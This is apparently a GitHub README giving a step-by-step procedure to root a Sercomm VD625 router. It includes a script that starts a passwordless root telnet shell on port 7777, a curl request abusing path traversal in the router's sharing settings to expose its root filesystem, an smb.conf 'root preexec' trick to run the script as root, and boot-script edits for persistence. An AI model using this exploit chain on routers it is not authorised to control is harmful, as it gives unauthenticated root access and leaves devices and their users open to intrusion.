Root Sercomm VD625
==================

[![size](https://img.shields.io/github/repo-size/xmase/Sercomm-VD625.svg)](https://github.com/xMase/Sercomm-VD625)
[![license](https://img.shields.io/github/license/xMase/Sercomm-VD625.svg)](https://github.com/xMase/Sercomm-VD625)


- activate the router usb sharing by insert a fat32 formatted stick with the **runme** file inside it:

```sh
    #!/bin/sh
    
    exec > /mnt/shares/USB2FlashStorage/Partition1/it_worked 2>&1
    set -x

    ps
    date
    
    iptables -D INPUT -i ! br0 -p tcp --dport 7777 -j DROP >/dev/null 2>&1
    iptables -I INPUT -i ! br0 -p tcp --dport 7777 -j DROP    
    /bin/telnetd -F -p 7777 -l /bin/sh&
```

- run the **curl** command to enable folder sharing:

    **(csrf_token should be updated each time by taking it from a random webgui request)**

```sh
curl -X POST -i 'http://192.168.1.1/data/settings_content_sharing_device.json?_=1551786266690&csrf_token=HK08CC1C89JW113A2638' --data 'sharing_device=[{"device_id":"1","root_folder":"/","ns_content_sharing_enable":"1","ns_require_username_password":"0","ns_user_id":"1","ns_share_all_folders":"0","ns_share_folder_data":"1|root|../../../:0|Partition1|:"}]'
```

- once done, disable and re-enable the usb sharing function from the router to apply the changes

- navigate with **dolphin** on the newly shared folder (*on windows use network sharing*)

>smb://admin@RouterIp/

- samba process was spawned with the user **nobody** who does not have root privileges, to remedy this, replace the router ***/etc/samba/smb.conf*** file with the one in the shared folder on the usb key

- example of modified **smb.conf** file:

```ini
    [global]
    ...
    log file = /tmp/a1
    
    config file = /etc/samba/smb.conf (remove this)

    [Partition1]
    ...
	root preexec = /bin/sh -c "/mnt/shares/USB2FlashStorage/Partition1/runme &" 
```

- This config file force samba to **run telnet as root on port 7777**

- to start samba *preexec* navigate in **/Partition1/USB2FlashStorage/Partition1/** and **/root/etc/samba/** multiple times

- in the **/tmp/** directory the file **a1** will appear which will be a smbd log for debugging errors

- in the folder **/Partition1/USB2FlashStorage/Partition1/** the file **it_worked** will appear which will show us the success of the procedure

- now can **connect** to the **router ip on port 7777** with **telnet**

- remount the root folder in **rw** mode<br>
    **(/dev/mtdblock7 - /dev/mtdbloc6 in this case I am on block 7)**

>mount -n -t jffs2 -o rw,remount /dev/mtdblock7 /

- insert this changes in **/etc/rcS** to **autorun** the **exploit** on startup:<br>
    **(please note that the USB must always remain connected to the router)**

```sh
    ...
    # after this line "mount -n -t ramfs ramfs /tmp":
    ...
    # log
    exec > /tmp/bootlog 2>&1
    set -x
    ...
    # chage this "rc init > /dev/null" to rc "init"
    ...
    # after last line insert:
    ...
    # my
    mkdir -m 0777 /mnt/my/ 
    mount -n -t vfat -o rw /dev/sda1 /mnt/my/ 
    /usr/sbin/ls "/mnt/my" 
    ((/usr/sbin/sh /mnt/my/runme 0<&- &>/dev/null &) &)
```

- before restarting the device **disable the shared folders on the router** and **remount the root folder in ro** mode

```sh
    mount -n -t jffs2 -o ro,remount /dev/mtdblock7 /
    reboot
```

Tips
====

SercommVD625.iso Telecom Italia_VD625_AGSOT_1.0.8.tar/Telecom Italia_VD625_AGSOT_1.0.8/VD625_v1.0.8/build/VD625/target.tgz => **gui files**

AGSOT_1.0.8.img => **to extract the router upgrade image first use sercomm_fwutils-master and than python jefferson to extract fs**

To view the router configuration use the command **"cmld_client get_node Device."**.